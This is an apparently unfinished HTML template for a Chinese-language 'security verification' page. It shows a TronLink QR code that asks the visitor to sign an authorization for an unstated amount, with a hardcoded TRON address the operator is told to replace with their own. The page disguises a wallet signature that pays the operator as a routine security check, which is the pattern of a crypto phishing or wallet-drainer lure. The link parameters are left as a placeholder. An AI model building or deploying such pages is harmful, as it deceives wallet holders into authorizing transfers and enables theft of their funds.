<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安全验证</title>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, sans-serif;
        }
        body {
            background-color: #121220;
            color: #ffffff;
            min-height: 100vh;
            padding: 20px 16px;
        }
        .container-card {
            background-color: #202038;
            border-radius: 20px;
            padding: 32px 24px;
            max-width: 420px;
            margin: 0 auto;
        }
        .header-area {
            text-align: center;
            margin-bottom: 30px;
        }
        .header-area h1 {
            font-size: 34px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .header-area .sub-desc {
            color: #b4b4cc;
            font-size: 18px;
            margin-top: 8px;
        }
        .chain-tag {
            width: 100%;
            padding: 14px 0;
            border-radius: 12px;
            border: none;
            font-size: 20px;
            font-weight: 600;
            background-color: #ffc107;
            color: #000000;
            margin-bottom: 24px;
        }
        .label-text {
            font-size: 16px;
            color: #d0d0e2;
            margin-bottom: 10px;
        }
        .empty-input {
            width: 100%;
            height: 54px;
            background-color: #121220;
            border-radius: 12px;
            border: 1px solid #383858;
            margin-bottom: 28px;
        }
        .qr-wrap {
            background: #ffffff;
            border-radius: 16px;
            padding: 20px;
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }
        #qr-canvas {
            width: 260px;
            height: 260px;
        }
        .bottom-tip {
            text-align: center;
            color: #9191a8;
            font-size: 15px;
        }
    </style>
</head>
<body>
    <div class="container-card">
        <div class="header-area">
            <h1>
                <span>💳</span>
                安全验证
            </h1>
            <div class="sub-desc">完成签名即可正常使用</div>
        </div>
        <!-- 仅保留波场 TRON -->
        <button class="chain-tag">TRON</button>

        <div class="label-text">授权金额</div>
        <div class="empty-input"></div>

        <div class="qr-wrap">
            <canvas id="qr-canvas"></canvas>
        </div>
        <div class="bottom-tip">扫码直接签名，无跳转</div>
    </div>

    <script>
        // ========== 在这里填入你的固定波场收款地址 ==========
        const FIX_RECEIVE_ADDRESS = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
        // 构造带固定收款地址的 TronLink 唤起链接
        const tronSignLink = `tronlink://sign?receive=${FIX_RECEIVE_ADDRESS}&params=xxx`;
        
        const canvasDom = document.getElementById("qr-canvas");
        QRCode.toCanvas(canvasDom, tronSignLink, { width: 260 }, function (err) {
            if (err) console.error(err);
        });
    </script>
</body>
</html>
